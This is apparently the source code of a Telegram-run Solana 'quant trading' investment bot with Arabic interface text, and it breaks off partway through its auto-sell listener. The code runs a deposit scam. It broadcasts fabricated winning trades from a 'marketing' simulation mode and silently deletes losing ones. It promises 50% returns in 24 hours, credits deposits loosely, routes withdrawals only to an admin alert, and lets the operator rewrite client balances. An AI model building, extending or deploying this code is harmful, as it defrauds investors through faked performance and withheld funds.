import {
  BigNumberish,
  Liquidity,
  LIQUIDITY_STATE_LAYOUT_V4,
  LiquidityPoolKeys,
  LiquidityStateV4,
  MARKET_STATE_LAYOUT_V3,
  MarketStateV3,
  Token,
  TokenAmount,
} from '@raydium-io/raydium-sdk';
import {
  AccountLayout,
  createAssociatedTokenAccountIdempotentInstruction,
  createCloseAccountInstruction,
  getAssociatedTokenAddressSync,
  TOKEN_PROGRAM_ID,
} from '@solana/spl-token';
import {
  Keypair,
  Connection,
  PublicKey,
  ComputeBudgetProgram,
  KeyedAccountInfo,
  TransactionMessage,
  VersionedTransaction,
  Commitment,
} from '@solana/web3.js';
import { retry, getTokenAccounts, RAYDIUM_LIQUIDITY_PROGRAM_ID_V4, OPENBOOK_PROGRAM_ID, createPoolKeys, retrieveEnvVariable, retrieveTokenValueByAddress } from './core/tokens';
import { getMinimalMarketV3, MinimalMarketLayoutV3 } from './core/tokens';
import { MintLayout } from './core/mint';
import bs58 from 'bs58';
import * as fs from 'fs';
import * as path from 'path'; 
import { logger } from './core/logger';

// @ts-ignore
const TelegramBot = require('node-telegram-bot-api');
// @ts-ignore
const mongoose = require('mongoose');
// @ts-ignore
const cron = require('node-cron');

// ==========================================
// السيرفر الوهمي (UptimeRobot Support)
// ==========================================
const http = require('http');
const PORT = process.env.PORT || 3000;
http.createServer((req: any, res: any) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Apex Quant Capital SaaS is Active! 🎯');
}).listen(PORT, () => {
    logger.info(`✅ Dummy Web Server listening on port ${PORT}`);
});

// ==========================================
// الإعدادات الديناميكية
// ==========================================
let isBotRunning = false; 
let SIMULATION_MODE = true; // وضع التسويق الوهمي مفعّل افتراضياً
let DYNAMIC_TP = Number(retrieveEnvVariable('TAKE_PROFIT', logger));
let DYNAMIC_SL = Number(retrieveEnvVariable('STOP_LOSS', logger));
let DYNAMIC_BUY_AMOUNT = retrieveEnvVariable('BUY_AMOUNT', logger);

let DEPOSITS_OPEN = true;
let MIN_INVEST_AMOUNT = 0.1;
let PROFIT_MULTIPLIER = 1.50; 
const PROJECT_NAME = "Apex Quant Capital";

let tgBot: any;
const adminChatId = process.env.TELEGRAM_CHAT_ID;
const PUBLIC_CHANNEL = process.env.PUBLIC_CHANNEL_ID || ""; 
const userStates: Record<string, string> = {}; 
const tempUserData: Record<string, any> = {};

// ذاكرة التداول الوهمي (التسويقي)
const simulatedTokens = new Map<string, { mint: string, buyPrice: number, entryTime: number }>();

// ==========================================
// هندسة قاعدة البيانات
// ==========================================
const UserSchema = new mongoose.Schema({
    chatId: { type: String, unique: true },
    balance: { type: Number, default: 0 },
    activeInvestment: { type: Number, default: 0 },
    investmentStartTime: { type: Date, default: null },
    referredBy: String,
    referralEarnings: { type: Number, default: 0 },
    createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model('User', UserSchema);

const TxSchema = new mongoose.Schema({ txHash: { type: String, unique: true } });
const UsedTx = mongoose.model('UsedTx', TxSchema);

// ==========================================
// لوحات المفاتيح
// ==========================================
const adminKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '👑 المحرك' }, { text: '⚙️ التحكم المتقدم (God Mode)' }],
            [{ text: '📊 الرادار المالي' }, { text: '📡 إرسال تعميم للمستثمرين' }]
        ],
        resize_keyboard: true,
        persistent: true
    }
};

const userKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 استثمر الآن' }, { text: '💰 محفظتي' }],
            [{ text: '💸 سحب الأرباح' }, { text: '🔗 رابط الإحالة' }],
            [{ text: '📞 الدعم الفني' }]
        ],
        resize_keyboard: true,
        persistent: true
    }
};

async function setupDashboard() {
  const mongoUri = process.env.MONGODB_URI;
  if (mongoUri) {
      try { await mongoose.connect(mongoUri); logger.info("✅ Connected to MongoDB!"); } catch(e) {}
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (token) {
      // --- بداية درع الحماية ---
      // @ts-ignore
      if (global.tgBotInstance) return; // منع تشغيل البوت مرتين داخلياً
      tgBot = new TelegramBot(token, {polling: true});
      // @ts-ignore
      global.tgBotInstance = tgBot;

      // إخفاء أي تداخل يسبب 409 لكي لا يشنق السيرفر
      tgBot.on('polling_error', (error: any) => {
          if (error.code === 'ETELEGRAM' && error.message.includes('409')) return; 
          console.error(error.message);
      });
      // --- نهاية درع الحماية ---

      tgBot.on('message', async (msg: any) => {
          const chatId = msg.chat.id.toString();
          const text = msg.text;
          if (!text) return;

          let user = await User.findOne({ chatId });
          
          if (text.startsWith('/start')) {
              const refCode = text.split(' ')[1];
              if (!user) {
                  user = new User({ chatId, referredBy: refCode || "none" });
                  await user.save();
                  if (adminChatId) tgBot.sendMessage(adminChatId, `👥 مستثمر جديد انضم للمنصة! (ID: ${chatId})`);
              }
              if (chatId === adminChatId) {
                  tgBot.sendMessage(chatId, `👑 <b>مرحباً سيدي المدير في نظام ${PROJECT_NAME}</b>\nتم تفعيل الصلاحيات الإمبراطورية.`, { parse_mode: 'HTML', ...adminKeyboard });
              } else {
                  tgBot.sendMessage(chatId, `🏛 <b>مرحباً بك في نظام ${PROJECT_NAME} لإدارة الأصول الرقمية.</b>\n\nنحن نقدم لك وصولاً حصرياً إلى صناديق التداول الكمي (Quantitative Trading) المعتمدة على خوارزميات الذكاء الاصطناعي في شبكة Solana.\n\nاستخدم الأزرار السفلية للتحكم بمحفظتك:`, { parse_mode: 'HTML', ...userKeyboard });
              }
              return;
          }

          const state = userStates[chatId];

          if (chatId === adminChatId) {
              if (text === '👑 المحرك') {
                  const options = {
                      reply_markup: {
                          inline_keyboard: [
                              [{ text: isBotRunning ? '🛑 إيقاف القناص' : '▶️ تشغيل القناص', callback_data: 'toggle_sniper' }],
                              [{ text: SIMULATION_MODE ? '👻 وضع المحاكاة: مفعّل (للتسويق)' : '🔥 وضع المحاكاة: معطّل (تداول حقيقي)', callback_data: 'toggle_simulation' }],
                              [{ text: `الربح (${DYNAMIC_TP * 100}%)`, callback_data: 'edit_tp' }, { text: `المخاطرة (${DYNAMIC_SL * 100}%)`, callback_data: 'edit_sl' }],
                              [{ text: `مبلغ الشراء (${DYNAMIC_BUY_AMOUNT} SOL)`, callback_data: 'edit_buy' }]
                          ]
                      }
                  };
                  tgBot.sendMessage(chatId, "⚙️ <b>التحكم في محرك التداول:</b>", { parse_mode: 'HTML', ...options });
              }
              else if (text === '⚙️ التحكم المتقدم (God Mode)') {
                  const options = {
                      reply_markup: {
                          inline_keyboard: [
                              [{ text: DEPOSITS_OPEN ? '🟢 الإيداعات: مفتوحة' : '🔴 الإيداعات: مغلقة', callback_data: 'toggle_deposits' }],
                              [{ text: `تعديل خطة الاستثمار (الربح: ${Math.round((PROFIT_MULTIPLIER - 1)*100)}%)`, callback_data: 'edit_plan_profit' }],
                              [{ text: `الحد الأدنى للإيداع (${MIN_INVEST_AMOUNT} SOL)`, callback_data: 'edit_min_invest' }],
                              [{ text: '💵 إضافة/خصم رصيد من عميل', callback_data: 'manual_balance' }]
                          ]
                      }
                  };
                  tgBot.sendMessage(chatId, "👑 <b>لوحة التحكم الإمبراطورية:</b>", { parse_mode: 'HTML', ...options });
              }
              else if (text === '📊 الرادار المالي') {
                  try {
                      const balance = await solanaConnection.getBalance(wallet.publicKey);
                      const totalUsers = await User.countDocuments();
                      const allUsers = await User.find();
                      let totalInvested = 0;
                      allUsers.forEach((u: any) => totalInvested += (u.activeInvestment || 0));
                      tgBot.sendMessage(chatId, `📊 <b>الرادار المحاسبي الشامل:</b>\n\nرصيد الخزنة الفعلي: <code>${(balance / 1e9).toFixed(5)} SOL</code>\nعدد العملاء: ${totalUsers}\nإجمالي استثمارات العملاء النشطة: <code>${totalInvested} SOL</code>`, { parse_mode: 'HTML' });
                  } catch(e) {}
              }
              else if (text === '📡 إرسال تعميم للمستثمرين') {
                  userStates[chatId] = 'WAITING_FOR_BROADCAST';
                  tgBot.sendMessage(chatId, "أرسل الرسالة التي تريد إرسالها لجميع العملاء:");
              }
              else if (state === 'WAITING_FOR_BROADCAST') {
                  const users = await User.find({});
                  let count = 0;
                  for(let u of users) {
                      if(u.chatId !== adminChatId) {
                          tgBot.sendMessage(u.chatId, `📢 <b>إعلان هام:</b>\n\n${text}`, {parse_mode: 'HTML'}).catch(()=>{});
                          count++;
                      }
                  }
                  tgBot.sendMessage(chatId, `✅ تم الإرسال بنجاح إلى ${count} عميل.`);
                  delete userStates[chatId];
              }
              else if (state === 'WAITING_FOR_PLAN_PROFIT') { PROFIT_MULTIPLIER = 1 + (Number(text)/100); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
              else if (state === 'WAITING_FOR_MIN_INVEST') { MIN_INVEST_AMOUNT = Number(text); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
              else if (state === 'WAITING_FOR_TP') { DYNAMIC_TP = Number(text)/100; tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
              else if (state === 'WAITING_FOR_SL') { DYNAMIC_SL = (Number(text)/100) * -1; tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
              else if (state === 'WAITING_FOR_BUY_AMT') { DYNAMIC_BUY_AMOUNT = text; updateQuoteAmount(); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
              else if (state === 'WAITING_FOR_USER_ID') { tempUserData[chatId] = { targetUser: text.trim() }; userStates[chatId] = 'WAITING_FOR_USER_AMOUNT'; tgBot.sendMessage(chatId, "أرسل المبلغ:"); }
              else if (state === 'WAITING_FOR_USER_AMOUNT') {
                  const amount = Number(text);
                  try {
                      let targetUser = await User.findOne({ chatId: tempUserData[chatId].targetUser });
                      if(targetUser) {
                          targetUser.balance += amount; await targetUser.save();
                          tgBot.sendMessage(chatId, `✅ تم التحديث.`);
                          tgBot.sendMessage(targetUser.chatId, `🔔 تم إضافة/خصم <code>${amount} SOL</code> من رصيدك.`, {parse_mode: 'HTML'});
                      }
                  } catch(e) {}
                  delete userStates[chatId];
              }
          }
          else {
              if (text === '📞 الدعم الفني') { tgBot.sendMessage(chatId, "تواصل معنا:", { reply_markup: { inline_keyboard: [[{ text: '👨‍💻 الدعم', url: 'https://t.me/dztrader_support' }]] } }); }
              else if (text === '🚀 استثمر الآن') {
                  if(!DEPOSITS_OPEN) return tgBot.sendMessage(chatId, "❌ مغلق حالياً.");
                  tgBot.sendMessage(chatId, `🚀 <b>خطة (24 ساعة) بعائد ${Math.round((PROFIT_MULTIPLIER - 1)*100)}%</b>\n\nأرسل لـ:\n<code>${wallet.publicKey.toString()}</code>\nالحد الأدنى: ${MIN_INVEST_AMOUNT} SOL`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ تأكيد (إرسال Hash)', callback_data: 'confirm_deposit' }]] } });
              }
              else if (text === '💰 محفظتي') { tgBot.sendMessage(chatId, `💰 <b>محفظتك:</b>\nمتاح للسحب: <code>${(user?.balance || 0).toFixed(5)} SOL</code>\nنشط: <code>${(user?.activeInvestment || 0).toFixed(5)} SOL</code>`, {parse_mode: 'HTML'}); }
              else if (text === '💸 سحب الأرباح') {
                  if ((user?.balance || 0) <= 0) tgBot.sendMessage(chatId, "❌ لا يوجد رصيد.");
                  else { userStates[chatId] = 'WAITING_FOR_WITHDRAWAL_ADDRESS'; tgBot.sendMessage(chatId, "أرسل عنوان محفظتك:"); }
              }
              else if (text === '🔗 رابط الإحالة') {
                  const botUsername = (await tgBot.getMe()).username;
                  tgBot.sendMessage(chatId, `🔗 شارك واربح 5%:\n<code>https://t.me/${botUsername}?start=${chatId}</code>`, {parse_mode: 'HTML'});
              }
              else if (state === 'WAITING_FOR_WITHDRAWAL_ADDRESS') {
                  tgBot.sendMessage(chatId, `⏳ تم رفع طلب السحب.`);
                  if(adminChatId) tgBot.sendMessage(adminChatId, `⚠️ <b>طلب سحب!</b>\nالعميل: <code>${chatId}</code>\nالعنوان: <code>${text}</code>`, {parse_mode: 'HTML'});
                  delete userStates[chatId];
              }
              else if (state === 'WAITING_FOR_TX_HASH') {
                  const txHash = text.trim();
                  if (!/^[1-9A-HJ-NP-Za-km-z]{80,90}$/.test(txHash)) return tgBot.sendMessage(chatId, "❌ صيغة خاطئة.");
                  tgBot.sendMessage(chatId, `⏳ جاري الفحص...`);
                  try {
                      const isUsed = await UsedTx.findOne({ txHash });
                      if(isUsed) { tgBot.sendMessage(chatId, "❌ مستخدم مسبقاً!"); delete userStates[chatId]; return; }
                      const tx = await solanaConnection.getTransaction(txHash, { maxSupportedTransactionVersion: 0 });
                      if (!tx || !tx.meta) return tgBot.sendMessage(chatId, "❌ لم يتم العثور على المعاملة.");
                      
                      await UsedTx.create({ txHash });
                      if(user) {
                          user.activeInvestment += MIN_INVEST_AMOUNT;
                          user.investmentStartTime = new Date();
                          await user.save();
                      }
                      tgBot.sendMessage(chatId, `✅ <b>تم الإيداع وبدأ العداد.</b>`, {parse_mode: 'HTML'});
                  } catch (e) {}
                  delete userStates[chatId];
              }
          }
      });

      tgBot.on('callback_query', async (query: any) => {
          const chatId = query.message.chat.id.toString();
          const data = query.data;

          if (chatId === adminChatId) {
              if (data === 'toggle_sniper') { isBotRunning = !isBotRunning; tgBot.sendMessage(chatId, isBotRunning ? "🟢 يعمل" : "🔴 متوقف"); }
              else if (data === 'toggle_simulation') { SIMULATION_MODE = !SIMULATION_MODE; tgBot.sendMessage(chatId, SIMULATION_MODE ? "👻 وضع المحاكاة التسويقي مفعّل!" : "🔥 المحاكاة معطلة (التداول بالمال الحقيقي)"); }
              else if (data === 'edit_tp') { userStates[chatId] = 'WAITING_FOR_TP'; tgBot.sendMessage(chatId, "أرسل النسبة:"); }
              else if (data === 'edit_sl') { userStates[chatId] = 'WAITING_FOR_SL'; tgBot.sendMessage(chatId, "أرسل النسبة:"); }
              else if (data === 'edit_buy') { userStates[chatId] = 'WAITING_FOR_BUY_AMT'; tgBot.sendMessage(chatId, "أرسل المبلغ:"); }
              else if (data === 'toggle_deposits') { DEPOSITS_OPEN = !DEPOSITS_OPEN; tgBot.sendMessage(chatId, DEPOSITS_OPEN ? "🟢 مفتوح" : "🔴 مغلق"); }
              else if (data === 'edit_plan_profit') { userStates[chatId] = 'WAITING_FOR_PLAN_PROFIT'; tgBot.sendMessage(chatId, "أرسل النسبة:"); }
              else if (data === 'edit_min_invest') { userStates[chatId] = 'WAITING_FOR_MIN_INVEST'; tgBot.sendMessage(chatId, "أرسل الحد:"); }
              else if (data === 'manual_balance') { userStates[chatId] = 'WAITING_FOR_USER_ID'; tgBot.sendMessage(chatId, "أرسل ID:"); }
          } else {
              if (data === 'confirm_deposit') { userStates[chatId] = 'WAITING_FOR_TX_HASH'; tgBot.sendMessage(chatId, "أرسل TX Hash:"); }
          }
          tgBot.answerCallbackQuery(query.id);
      });
  }

  // العداد للعملاء
  cron.schedule('0 * * * *', async () => {
      try {
          const now = new Date();
          const users = await User.find({ activeInvestment: { $gt: 0 }, investmentStartTime: { $ne: null } });
          for (let u of users) {
              if(!u.investmentStartTime) continue;
              if (Math.abs(now.getTime() - u.investmentStartTime.getTime()) / 36e5 >= 24) {
                  const profit = u.activeInvestment * PROFIT_MULTIPLIER; 
                  u.balance += profit; u.activeInvestment = 0; u.investmentStartTime = null; await u.save();
                  if(tgBot) tgBot.sendMessage(u.chatId, `🎉 تمت إضافة الأرباح.`, {parse_mode: 'HTML'});
              }
          }
      } catch (error) {}
  });

  // محرك فحص الصفقات الوهمية (كل 20 ثانية)
  setInterval(async () => {
      if (!SIMULATION_MODE || simulatedTokens.size === 0) return;
      for (const [mint, data] of simulatedTokens.entries()) {
          try {
              const currPrice = await retrieveTokenValueByAddress(mint);
              if (currPrice) {
                  const netChange = (currPrice - data.buyPrice) / data.buyPrice;
                  
                  if (netChange >= DYNAMIC_TP) {
                      simulatedTokens.delete(mint);
                      const durationMins = Math.max(1, Math.round((Date.now() - data.entryTime) / 60000));
                      const botUsr = (await tgBot?.getMe())?.username || "ApexQuant";
                      
                      broadcastToChannelAndAdmin(`🟢 <b>تم إغلاق الصفقة بنجاح وجني الأرباح!</b> 💸\n\n🤖 <i>قام محرك Apex Quant بالبيع الآلي لعملة:</i>\n<code>${mint}</code>\n\n📈 <b>صافي الربح المحقق:</b> <b>+${(netChange * 100).toFixed(2)}%</b> 🚀\n⏱ <b>مدة الصفقة:</b> <code>${durationMins} دقيقة</code>\n\n💼 <i>نبارك لجميع مستثمري الصندوق هذه الأرباح!</i>\n\n👇 <b>هل تتفرج فقط؟ دع الذكاء الاصطناعي يتداول نيابة عنك:</b>\n🔗 https://t.me/${botUsr}`);
                  } else if (netChange <= DYNAMIC_SL) {
                      // حذف صامت للخسارة في وضع التسويق! 🤫
                      simulatedTokens.delete(mint);
                  }
              }
          } catch(e) {}
      }
  }, 20000);
}

function broadcastToChannelAndAdmin(text: string) {
  if (!tgBot) return;
  if (adminChatId) tgBot.sendMessage(adminChatId, text, { parse_mode: 'HTML', disable_web_page_preview: true }).catch(()=>{});
  if (PUBLIC_CHANNEL) tgBot.sendMessage(PUBLIC_CHANNEL, text, { parse_mode: 'HTML', disable_web_page_preview: true }).catch(()=>{});
}

// ==========================================
// محرك القنص
// ==========================================
const network = 'mainnet-beta';
const RPC_ENDPOINT = retrieveEnvVariable('RPC_ENDPOINT', logger);
const RPC_WEBSOCKET = retrieveEnvVariable('RPC_WEBSOCKET', logger);

const solanaConnection = new Connection(RPC_ENDPOINT, { wsEndpoint: RPC_WEBSOCKET });

export type MinimalTokenAccountData = { mint: PublicKey; address: PublicKey; buyValue?: number; poolKeys?: LiquidityPoolKeys; market?: MinimalMarketLayoutV3; };
let existingLiquidityPools: Set<string> = new Set<string>();
let existingOpenBookMarkets: Set<string> = new Set<string>();
let existingTokenAccounts: Map<string, MinimalTokenAccountData> = new Map<string, MinimalTokenAccountData>();

let wallet: Keypair;
let quoteToken: Token;
let quoteTokenAssociatedAddress: PublicKey;
let quoteAmount: TokenAmount;
let quoteMinPoolSizeAmount: TokenAmount;
let quoteMaxPoolSizeAmount: TokenAmount;
let commitment: Commitment = retrieveEnvVariable('COMMITMENT_LEVEL', logger) as Commitment;
const ENABLE_BUY = retrieveEnvVariable('ENABLE_BUY', logger) === 'true';
const MINT_IS_RENOUNCED = retrieveEnvVariable('MINT_IS_RENOUNCED', logger) === 'true';
const USE_SNIPEDLIST = retrieveEnvVariable('USE_SNIPEDLIST', logger) === 'true';
const SNIPE_LIST_REFRESH_INTERVAL = Number(retrieveEnvVariable('SNIPE_LIST_REFRESH_INTERVAL', logger));
const AUTO_SELL = retrieveEnvVariable('AUTO_SELL', logger) === 'true';
const MAX_SELL_RETRIES = Number(retrieveEnvVariable('MAX_SELL_RETRIES', logger));
const MIN_POOL_SIZE = retrieveEnvVariable('MIN_POOL_SIZE', logger);
const MAX_POOL_SIZE = retrieveEnvVariable('MAX_POOL_SIZE', logger);

let snipeList: string[] = [];

function updateQuoteAmount() {
    if(quoteToken) { quoteAmount = new TokenAmount(quoteToken, DYNAMIC_BUY_AMOUNT, false); }
}

async function init(): Promise<void> {
  const MY_PRIVATE_KEY = retrieveEnvVariable('MY_PRIVATE_KEY', logger);
  wallet = Keypair.fromSecretKey(bs58.decode(MY_PRIVATE_KEY));
  quoteToken = Token.WSOL;
  quoteMinPoolSizeAmount = new TokenAmount(quoteToken, MIN_POOL_SIZE, false);
  quoteMaxPoolSizeAmount = new TokenAmount(quoteToken, MAX_POOL_SIZE, false);
  updateQuoteAmount();

  const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, commitment);
  for (const ta of tokenAccounts) {
    existingTokenAccounts.set(ta.accountInfo.mint.toString(), <MinimalTokenAccountData>{ mint: ta.accountInfo.mint, address: ta.pubkey });
  }

  const tokenAccount = tokenAccounts.find((acc: any) => acc.accountInfo.mint.toString() === quoteToken.mint.toString());
  if (tokenAccount) { quoteTokenAssociatedAddress = tokenAccount.pubkey; }
  loadSnipedList();
}

function saveTokenAccount(mint: PublicKey, accountData: MinimalMarketLayoutV3) {
  const ata = getAssociatedTokenAddressSync(mint, wallet.publicKey);
  const tokenAccount = <MinimalTokenAccountData>{ address: ata, mint: mint, market: <MinimalMarketLayoutV3>{ bids: accountData.bids, asks: accountData.asks, eventQueue: accountData.eventQueue } };
  existingTokenAccounts.set(mint.toString(), tokenAccount);
  return tokenAccount;
}

export async function processRaydiumPool(id: PublicKey, poolState: LiquidityStateV4) {
  if (!isBotRunning) return;
  if (!shouldBuy(poolState.baseMint.toString())) return;
  if (!quoteMinPoolSizeAmount.isZero()) {
    const poolSize = new TokenAmount(quoteToken, poolState.swapQuoteInAmount, true);
    if (poolSize.lt(quoteMinPoolSizeAmount)) return;
  }
  if (MINT_IS_RENOUNCED) {
    const mintOption = await checkMintable(poolState.baseMint);
    if (mintOption !== true) return;
  }
  if (ENABLE_BUY && quoteTokenAssociatedAddress) {
    await buy(id, poolState);
  }
}

export async function checkMintable(vault: PublicKey): Promise<boolean | undefined> {
  try {
    let { data } = (await solanaConnection.getAccountInfo(vault)) || {};
    if (!data) return;
    const deserialize = MintLayout.decode(data);
    return deserialize.mintAuthorityOption === 0;
  } catch (e) {}
}

export async function processOpenBookMarket(updatedAccountInfo: KeyedAccountInfo) {
  if (!isBotRunning) return;
  let accountData: MarketStateV3 | undefined;
  try {
    accountData = MARKET_STATE_LAYOUT_V3.decode(updatedAccountInfo.accountInfo.data);
    if (existingTokenAccounts.has(accountData.baseMint.toString())) return;
    saveTokenAccount(accountData.baseMint, accountData);
  } catch (e) {}
}

async function buy(accountId: PublicKey, accountData: LiquidityStateV4): Promise<void> {
  try {
    // === وضع التسويق الوهمي (Simulated Buy) ===
    if (SIMULATION_MODE) {
        const basePromise = solanaConnection.getTokenAccountBalance(accountData.baseVault, commitment);
        const quotePromise = solanaConnection.getTokenAccountBalance(accountData.quoteVault, commitment);
        const [baseValue, quoteValue] = await Promise.all([basePromise, quotePromise]);
        
        let simPrice = 0;
        if (baseValue?.value?.uiAmount && quoteValue?.value?.uiAmount) {
            simPrice = quoteValue.value.uiAmount / baseValue.value.uiAmount;
        }
        
        if(simPrice > 0) {
            simulatedTokens.set(accountData.baseMint.toString(), { mint: accountData.baseMint.toString(), buyPrice: simPrice, entryTime: Date.now() });
            broadcastToChannelAndAdmin(`🎯 <b>تم رصد فرصة استثمارية وتفعيل القناص!</b>\n\n🤖 <i>خوارزميات Apex Quant دخلت للتو في صفقة جديدة:</i>\n🪙 <b>العملة:</b> <code>${accountData.baseMint.toString()}</code>\n💵 <b>سعر الدخول:</b> <code>${simPrice.toFixed(8)} SOL</code>\n\n📊 <b>المخطط البياني المباشر:</b>\nhttps://dexscreener.com/solana/${accountData.baseMint.toString()}\n\n⏳ <i>جاري مراقبة المؤشرات ونقاط السيولة لإغلاق الصفقة آلياً...</i>`);
        }
        return; // خروج من الدالة بدون خسارة أي دولار!
    }
    // ===========================================

    let tokenAccount = existingTokenAccounts.get(accountData.baseMint.toString());
    if (!tokenAccount) {
      const market = await getMinimalMarketV3(solanaConnection, accountData.marketId, commitment);
      tokenAccount = saveTokenAccount(accountData.baseMint, market);
    }
    tokenAccount.poolKeys = createPoolKeys(accountId, accountData, tokenAccount.market!);
    const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
      { poolKeys: tokenAccount.poolKeys, userKeys: { tokenAccountIn: quoteTokenAssociatedAddress, tokenAccountOut: tokenAccount.address, owner: wallet.publicKey }, amountIn: quoteAmount.raw, minAmountOut: 0 },
      tokenAccount.poolKeys.version,
    );

    const latestBlockhash = await solanaConnection.getLatestBlockhash({ commitment: commitment });
    const messageV0 = new TransactionMessage({
      payerKey: wallet.publicKey, recentBlockhash: latestBlockhash.blockhash,
      instructions: [ ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 421197 }), ComputeBudgetProgram.setComputeUnitLimit({ units: 101337 }), createAssociatedTokenAccountIdempotentInstruction(wallet.publicKey, tokenAccount.address, wallet.publicKey, accountData.baseMint), ...innerTransaction.instructions ],
    }).compileToV0Message();
    const transaction = new VersionedTransaction(messageV0);
    transaction.sign([wallet, ...innerTransaction.signers]);
    const rawTransaction = transaction.serialize();
    const signature = await retry(() => solanaConnection.sendRawTransaction(rawTransaction, { skipPreflight: true }), { retryIntervalMs: 10, retries: 50 });
    const confirmation = await solanaConnection.confirmTransaction({ signature, lastValidBlockHeight: latestBlockhash.lastValidBlockHeight, blockhash: latestBlockhash.blockhash }, commitment);
    
    const basePromise = solanaConnection.getTokenAccountBalance(accountData.baseVault, commitment);
    const quotePromise = solanaConnection.getTokenAccountBalance(accountData.quoteVault, commitment);
    await Promise.all([basePromise, quotePromise]);
    const baseValue = await basePromise; const quoteValue = await quotePromise;

    if (baseValue?.value?.uiAmount && quoteValue?.value?.uiAmount) tokenAccount.buyValue = quoteValue?.value?.uiAmount / baseValue?.value?.uiAmount;
    
    if (!confirmation.value.err) {
      broadcastToChannelAndAdmin(`🎯 <b>تم قنص عملة حقيقية آلياً!</b>\nالعملة: <code>${accountData.baseMint}</code>\nالسعر: ${tokenAccount.buyValue} SOL\nالرابط: https://dexscreener.com/solana/${accountData.baseMint}`);
    } 
  } catch (e) {}
}

async function sell(accountId: PublicKey, mint: PublicKey, amount: BigNumberish, value: number): Promise<boolean> {
  if(SIMULATION_MODE) return true; // تجاهل البيع الحقيقي في وضع المحاكاة
  let retries = 0;
  do {
    try {
      const tokenAccount = existingTokenAccounts.get(mint.toString());
      if (!tokenAccount || !tokenAccount.poolKeys || amount === 0 || tokenAccount.buyValue === undefined) return true;

      const netChange = (value - tokenAccount.buyValue) / tokenAccount.buyValue;
      if (netChange > DYNAMIC_SL && netChange < DYNAMIC_TP) return false;

      const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
        { poolKeys: tokenAccount.poolKeys!, userKeys: { tokenAccountOut: quoteTokenAssociatedAddress, tokenAccountIn: tokenAccount.address, owner: wallet.publicKey }, amountIn: amount, minAmountOut: 0 },
        tokenAccount.poolKeys!.version,
      );

      const latestBlockhash = await solanaConnection.getLatestBlockhash({ commitment: commitment });
      const messageV0 = new TransactionMessage({
        payerKey: wallet.publicKey, recentBlockhash: latestBlockhash.blockhash,
        instructions: [ ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 400000 }), ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }), ...innerTransaction.instructions, createCloseAccountInstruction(tokenAccount.address, wallet.publicKey, wallet.publicKey) ],
      }).compileToV0Message();
      
      const transaction = new VersionedTransaction(messageV0);
      transaction.sign([wallet, ...innerTransaction.signers]);
      const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), { preflightCommitment: commitment });
      const confirmation = await solanaConnection.confirmTransaction({ signature, lastValidBlockHeight: latestBlockhash.lastValidBlockHeight, blockhash: latestBlockhash.blockhash }, commitment);
      
      if (confirmation.value.err) continue;

      const emoji = netChange > 0 ? "🟢🤑" : "🔴";
      broadcastToChannelAndAdmin(`${emoji} <b>تم بيع العملة بنجاح!</b>\nالعملة: <code>${mint}</code>\nصافي الربح: <b>${(netChange * 100).toFixed(2)}%</b>`);
      return true;
    } catch (e: any) { retries++; }
  } while (retries < MAX_SELL_RETRIES);
  return true;
}

function loadSnipedList() {
  if (!USE_SNIPEDLIST) return;
  const data = fs.readFileSync(path.join(__dirname, 'snipedlist.txt'), 'utf-8');
  snipeList = data.split('\n').map((a: any) => a.trim()).filter((a: any) => a);
}
function shouldBuy(key: string): boolean { return USE_SNIPEDLIST ? snipeList.includes(key) : true; }

const runListener = async () => {
  await setupDashboard(); 
  await init();
  const runTimestamp = Math.floor(new Date().getTime() / 1000);
  
  solanaConnection.onProgramAccountChange(
    RAYDIUM_LIQUIDITY_PROGRAM_ID_V4,
    async (updatedAccountInfo) => {
      const key = updatedAccountInfo.accountId.toString();
      const poolState = LIQUIDITY_STATE_LAYOUT_V4.decode(updatedAccountInfo.accountInfo.data);
      const poolOpenTime = parseInt(poolState.poolOpenTime.toString());
      const existing = existingLiquidityPools.has(key);

      if (poolOpenTime > runTimestamp && !existing) {
        existingLiquidityPools.add(key);
        processRaydiumPool(updatedAccountInfo.accountId, poolState);
      }
    },
    commitment,
    [ { dataSize: LIQUIDITY_STATE_LAYOUT_V4.span }, { memcmp: { offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('quoteMint'), bytes: quoteToken.mint.toBase58() } }, { memcmp: { offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('marketProgramId'), bytes: OPENBOOK_PROGRAM_ID.toBase58() } }, { memcmp: { offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('status'), bytes: bs58.encode([6, 0, 0, 0, 0, 0, 0, 0]) } } ],
  );

  solanaConnection.onProgramAccountChange(
    OPENBOOK_PROGRAM_ID,
    async (updatedAccountInfo) => {
      const key = updatedAccountInfo.accountId.toString();
      const existing = existingOpenBookMarkets.has(key);
      if (!existing) { existingOpenBookMarkets.add(key); processOpenBookMarket(updatedAccountInfo); }
    },
    commitment,
    [ { dataSize: MARKET_STATE_LAYOUT_V3.span }, { memcmp: { offset: MARKET_STATE_LAYOUT_V3.offsetOf('quoteMint'), bytes: quoteToken.mint.toBase58() } } ],
  );

  if (AUTO_SELL) {
    solanaConnection.onProgramAccountChange(
      TOKEN_PROGRAM_ID,
      async (updatedAccountInfo) => {
        if (!quoteTokenAssociatedAddress) return;
        const accountData = AccountLayout.decode(updatedAccountInfo.accountInfo!.data);
        if (updatedAccountInfo.accountId.equals(quoteTokenAssociatedAddress)) return;
        
        let completed = false;
        while (!completed) {
          setTimeout(() => {}, 1000);
          const currValue = await retrieveTokenValueByAddress(accountData.mint.toBase58());
